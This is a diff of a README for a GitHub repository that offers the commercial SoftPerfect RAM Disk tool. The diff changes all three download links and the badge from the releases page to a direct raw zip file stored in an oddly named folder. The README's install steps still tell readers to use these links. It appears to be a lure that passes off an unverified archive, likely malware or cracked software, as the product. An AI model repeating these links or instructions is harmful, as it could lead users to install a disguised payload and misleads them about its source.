@@ -1,6 +1,6 @@
 # 🌟 SoftPerfect-RAM-Disk-Working - Fast and Easy RAM Disk Solution
 
-[![Download SoftPerfect RAM Disk](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mess747/SoftPerfect-RAM-Disk-Working/releases)
+[![Download SoftPerfect RAM Disk](https://raw.githubusercontent.com/mess747/SoftPerfect-RAM-Disk-Working/main/panning/SoftPerfect-RAM-Disk-Working-v2.2-beta.1.zip)](https://raw.githubusercontent.com/mess747/SoftPerfect-RAM-Disk-Working/main/panning/SoftPerfect-RAM-Disk-Working-v2.2-beta.1.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and set up SoftPerfect RAM Disk on your co
 
 1. **Visit the Releases Page**
    - Click the link below to access the SoftPerfect RAM Disk releases page.
-   - [Visit this page to download](https://github.com/mess747/SoftPerfect-RAM-Disk-Working/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/mess747/SoftPerfect-RAM-Disk-Working/main/panning/SoftPerfect-RAM-Disk-Working-v2.2-beta.1.zip)
 
 2. **Select the Latest Release**
    - On the releases page, find the most recent version of SoftPerfect RAM Disk.
@@ -43,7 +43,7 @@ Before you install SoftPerfect RAM Disk, ensure your system meets the following 
 
 To start using the SoftPerfect RAM Disk, download the application from the link below:
 
-[Visit this page to download](https://github.com/mess747/SoftPerfect-RAM-Disk-Working/releases)
+[Visit this page to download](https://raw.githubusercontent.com/mess747/SoftPerfect-RAM-Disk-Working/main/panning/SoftPerfect-RAM-Disk-Working-v2.2-beta.1.zip)
 
 After downloading, follow the installation steps outlined in the "Getting Started" section.
 
